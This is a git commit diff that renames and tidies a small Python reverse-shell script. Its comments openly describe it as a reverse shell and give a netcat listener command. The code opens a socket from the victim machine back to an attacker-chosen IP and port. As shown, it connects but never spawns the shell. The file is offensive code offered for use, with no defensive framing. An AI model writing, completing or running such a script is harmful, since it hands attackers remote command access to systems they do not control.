d7d76cc4e253517391f75980c7e9b3193f0eaa8c
hackerman234 <56136248+hackerman234@users.noreply.github.com>
2020-02-02 10:56:02 -0500

    Update reverse_shell.py

--- reverse_shell.py
+++ reverse_shell.py
@@ -1,21 +1,18 @@
-#!/usr/bin/python3
 # a python reverse shell
 # set up a netcat listner
 # nc -lvp 4444
 # tested only on linux
-
 
 import socket
 import os
 import subprocess
 import pty
 
-def main_connection():      
-    host = "192.168.1.238"                                  # change this to your IP
-    port = 4444                                             # you can change this to any port
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   # make the connection
-    s.connect((host, port))                                 # connect back
+def connection():
+    host = "192.168.1.238" # Change this to your IP
+    port = 4444            # Change the port if you want to
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))   
 
-main_connection()
-
+connection()
 
